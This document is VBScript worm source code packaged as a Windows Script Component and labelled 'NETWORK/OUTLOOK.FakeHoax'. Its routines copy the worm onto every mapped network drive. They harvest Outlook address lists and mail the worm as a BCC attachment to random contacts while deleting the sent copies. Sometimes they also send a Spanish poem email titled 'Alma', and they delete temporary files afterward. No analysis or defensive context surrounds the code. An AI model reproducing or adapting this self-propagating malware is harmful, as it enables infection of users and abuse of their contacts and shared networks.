<?XML version="1.0"?>
<component>
  <comment>
    NETWORK/OUTLOOK.FakeHoax
  </comment>
  <public>
    <property name="AttachmentFile"/>
    <property name="TextFile"/>
    <property name="WormFile"/>
    <method name="DelTempFiles"/>
    <method name="NetworkSpreading">
      <parameter name="FileName"/>
    </method>
    <method name="OutlookSpreading">
      <parameter name="Body"/>
      <parameter name="MaxAmount"/>
      <parameter name="Subject"/>
    </method>
    <method name="ShowText">
      <parameter name="Content"/>
    </method>
  </public>
  <script language="VBScript">
    <![CDATA[
    Sub DelTempFiles
      On Error Resume Next
      Set FSO = CreateObject("Scripting.FileSystemObject")
      If FSO.FileExists(AttachmentFile) Then FSO.DeleteFile AttachmentFile, True
      If FSO.FileExists(TextFile) Then FSO.DeleteFile TextFile, True
      Set FSO = Nothing
    End Sub
    Sub NetworkSpreading(FileName)
      On Error Resume Next
      Set Network = CreateObject("WScript.Network")
      Set Shares = Network.EnumNetworkDrives
      If Shares.Count > 0 Then
        Set FSO = CreateObject("Scripting.FileSystemObject")
        For Counter1 = 0 To Shares.Count - 1
          If Shares.Item(Counter1) <> "" Then FSO.CopyFile WormFile, FSO.BuildPath(Shares.Item(Counter1), FileName)
        Next
        Set FSO = Nothing
      End If
      Set Shares = Nothing
      Set Network = Nothing
    End Sub
    Sub OutlookSpreading(MaxAmount, Subject, Body)
      On Error Resume Next
      Set FSO = CreateObject("Scripting.FileSystemObject")
      FSO.CopyFile WormFile, AttachmentFile
      Set FSO = Nothing
      Outlook = ""
      Set Outlook = CreateObject("Outlook.Application")
      If Outlook <> "" Then
        Set MAPI = Outlook.GetNameSpace("MAPI")
        For Each List In MAPI.AddressLists
          If List.AddressEntries.Count > 0 Then
            Set Email1 = Outlook.CreateItem(0)
            If List.AddressEntries.Count > MaxAmount Then
              Dim Address()
              ReDim Address(MaxAmount - 1)
              For Counter1 = 0 To MaxAmount - 1
                Address(Counter1) = Int(List.AddressEntries.Count * Rnd)
              Next
              For Counter1 = 0 To MaxAmount - 1
                For Counter2 = Counter1 + 1 To MaxAmount - 1
                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1
                Next
              Next
              For Counter1 = 0 To MaxAmount - 1
                If Address(Counter1) = -1 Then Address(Counter1) = Int(List.AddressEntries.Count * Rnd)
              Next
              For Counter1 = 0 To MaxAmount - 1
                For Counter2 = Counter1 + 1 To MaxAmount - 1
                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1
                Next
              Next
              For Counter1 = 0 To MaxAmount - 1
                If Address(Counter1) <> -1 Then
                  Set Entry = List.AddressEntries(Address(Counter1))
                  If Counter1 = 0 Then Addresses = Entry.Address Else Addresses = Addresses & "; " & Entry.Address
                  Set Entry = Nothing
                End If
              Next
            Else
              For Counter1 = 1 To List.AddressEntries.Count
                Set Entry = List.AddressEntries(Counter1)
                If Counter1 = 1 Then Addresses = Entry.Address Else Addresses = Addresses & "; " & Entry.Address
                Set Entry = Nothing
              Next
            End If
            Email1.BCC = Addresses
            Email1.Subject = Subject
            Email1.Body = Body
            Email1.Attachments.Add AttachmentFile
            Email1.DeleteAfterSubmit = True
            Email1.Send
            Set Email1 = Nothing
            Randomize
            If Int(5 * Rnd) = 0 Then
              Set Email2 = Outlook.CreateItem(0)
              Email2.BCC = Addresses
              Email2.Subject = "Alma"
              Email2.Body = "No alucines que te amo," & Chr(13) & Chr(10) & "cuando en realidad es solo" & Chr(13) & Chr(10) & "mi coraz" & Chr(243) & "n qui" & Chr(233) & "n lo hace." & Chr(13) & Chr(10) & "Porque como ya sabr" & Chr(225) & "s," & Chr(13) & Chr(10) & "mi coraz" & Chr(243) & "n no manda en mi vida," & Chr(13) & Chr(10) & "si as" & Chr(237) & " lo hiciera," & Chr(13) & Chr(10) & "mi alma estar" & Chr(237) & "a perdida."
              Email2.DeleteAfterSubmit = True
              Email2.Send
              Set Email2 = Nothing
            End If
          End If
        Next
        Set MAPI = Nothing
        Set Outlook = Nothing
      End If
    End Sub
    Sub ShowText(Content)
      On Error Resume Next
      Set FSO = CreateObject("Scripting.FileSystemObject")
      Set File = FSO.CreateTextFile(TextFile, True)
      File.Write(Content)
      File.Close
      Set File = Nothing
      Set FSO = Nothing
      Set WSHShell = CreateObject("WScript.Shell")
      WSHShell.Run(TextFile)
      Set WSHShell = Nothing
    End Sub
    ]]>
  </script>
</component>